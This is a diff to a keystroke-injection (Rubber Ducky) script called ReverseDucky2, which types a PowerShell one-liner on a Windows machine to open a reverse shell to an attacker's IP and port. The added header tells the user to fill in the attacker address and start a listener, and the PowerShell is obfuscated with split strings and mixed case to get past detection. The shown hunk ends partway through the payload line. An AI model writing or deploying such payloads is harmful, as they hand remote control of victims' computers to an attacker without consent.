@@ -1,3 +1,13 @@
+REM       ReverseDucky2
+REM       Version 1.0
+REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
+REM       Author: 0iphor13
+
+REM       Reverse shell executed in the background
+REM       Fill in Attacker-IP and Port in Line 19
+REM       DON'T FORGET TO START LISTENER
+
+
 DELAY 1500
 GUI r
 DELAY 500
@@ -6,7 +16,7 @@ DELAY 250
 ENTER
 
 DELAY 200
-STRING $IP='192.168.178.25';$Port=4444;$client = .('N'+'ew-O'+'bject') sYSteM.neT.soCKETs.TcPCLient
+STRING $IP='0.0.0.0';$Port=4444;$client = .('N'+'ew-O'+'bject') sYSteM.neT.soCKETs.TcPCLient
 DELAY 200
 STRING ($IP,$Port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|.('%'){0};while(($i = $s
 DELAY 200
